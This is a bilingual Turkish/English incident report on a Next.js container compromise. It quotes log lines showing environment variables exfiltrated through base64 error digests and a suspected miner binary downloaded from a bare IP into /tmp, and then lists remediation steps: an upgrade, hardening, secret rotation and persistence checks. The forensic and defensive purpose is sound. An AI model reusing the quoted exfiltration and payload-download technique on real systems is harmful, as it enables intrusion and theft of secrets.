# Güvenlik olayı / Security incident — 2026-08-07

## Ne oldu / What happened

`tugla-mha2ef-web-1` konteynerinin loglarında, uygulamanın normalde asla üretmeyeceği kayıtlar var:

```
⨯ [Error: x] { digest: 'L2FwcC9hcHBzL3dlYgo=' }          → base64: "/app/apps/web"
⨯ [Error: x] { digest: 'V0VCX1VSTD1odHRwczovL3R1Z2xhLmZ1bgpBSV9DUkFXTEVSU19BTExPV0VE…' }
                                                          → base64: konteynerin tüm ortam değişkenleri
Connecting to 77.90.13.20 (77.90.13.20:80)
saving to '/tmp/dashboard'
dashboard  100% |********************************| 8155k
'/tmp/dashboard' saved
Connecting to 77.90.13.20 … saving to '/tmp/v.json'
```

Okunuşu açık: bir saldırgan web konteynerinde **komut çalıştırmış** (`pwd`, `env`), çıktıyı hata
`digest` alanına base64 olarak sızdırmış, ardından ham bir IP adresinden **8 MB'lık `dashboard` adlı
bir ikili** ve `v.json` yapılandırmasını `/tmp` altına indirmiş. Bu, kripto madenci yerleştirmenin
klasik imzasıdır.

The log lines above are command output (`pwd`, `env`) exfiltrated through error digests, followed by
a payload download from a bare IP into `/tmp` — a textbook miner drop after remote code execution.

## Etkilenen / Scope

- Web konteyneri (Next.js 15.3.3). Bu sürüm eskidir ve bilinen açıkları vardır.
- Konteynerin ortam değişkenleri sızdırılmıştır. Bu, **tüm sırların yakılmış sayılması** demektir:
  `JWT_ACCESS_SECRET`, `JWT_REFRESH_SECRET`, `SESSION_ENCRYPTION_KEY`, `INTERNAL_API_KEY`,
  veritabanı parolası, MinIO anahtarları, SMTP ve OAuth gizli anahtarları.

## Depoda yapılanlar / What was fixed here

1. **Next.js 15.3.3 → 15.5.23** (web ve admin). Bu tek başına en önemli adımdır.
2. **Konteyner sertleştirmesi** (`compose.production.yml`): `read_only: true`, tüm Linux
   yetenekleri düşürüldü (`cap_drop: ALL`), `no-new-privileges`, `/tmp` küçük ve `noexec` bir
   tmpfs. Bir sonraki açıkta bile yük yazılamaz ve çalıştırılamaz.
3. Bu doküman.

## Sunucuda yapılması gerekenler / Required on the server

Sırasıyla:

1. **Yükü temizle.** `docker compose down`, ardından web konteynerini yeniden oluştur. Çalışan
   şüpheli süreçleri ve `/tmp/dashboard`, `/tmp/v.json` dosyalarını kontrol et. Konteyner
   yeniden oluşturulduğunda dosya sistemi sıfırlanır; kalıcılık **host** üzerinde aranmalıdır:
   `crontab -l`, `/etc/cron.*`, `systemctl list-units --type=service`, `~/.ssh/authorized_keys`.
2. **Tüm sırları döndür.** `.env` içindeki her anahtar yeniden üretilmelidir. JWT sırları
   değiştiğinde tüm oturumlar düşer; bu istenen davranıştır.

   Döndürülenler (2026-08-08 itibarıyla tamamlandığı bildirildi):
   `JWT_ACCESS_SECRET`, `JWT_REFRESH_SECRET`, `SESSION_ENCRYPTION_KEY`, `INTERNAL_API_KEY`,
   veritabanı parolası, MinIO anahtarları.

   **Hâlâ döndürülmesi gerekenler** — sızan dökümde konteynerin _tüm_ ortamı vardı:

   - `SMTP_PASSWORD` (ve gerekiyorsa `SMTP_USER`)
   - `GOOGLE_CLIENT_SECRET` (Google Cloud Console'dan yeni istemci sırrı)
   - `APPLE_PRIVATE_KEY` / `APPLE_KEY_ID` (tanımlıysa)
   - `ADMIN_BOOTSTRAP_PASSWORD` ve panele giren yönetici hesaplarının parolaları
   - `SENTRY_DSN` (tanımlıysa; DSN gizli değildir ama yeniden üretmek ucuzdur)
   - **Dokploy dağıtım webhook adresi.** Bu adres tek başına dağıtım tetikler; ekran
     görüntülerinde göründüğü için yeniden üretilmelidir.
   - Dokploy paneli parolası ve sunucuya erişen SSH anahtarları

3. **Veritabanı parolasını ve MinIO anahtarlarını değiştir.**
4. **Yeni imajları dağıt** (Next 15.5.23 + sertleştirme).
5. **Hesap verisini gözden geçir:** yönetici rolü verilmiş beklenmedik kullanıcı var mı
   (`AuditLog`, `User.role`), tanımadığın oturumlar var mı.
6. Mümkünse VPS'i ve Dokploy erişimini de gözden geçir: SSH anahtarları, Dokploy parolası.

Sırlar döndürülmeden dağıtım yapmak, saldırganın elindeki anahtarların geçerli kalması demektir.
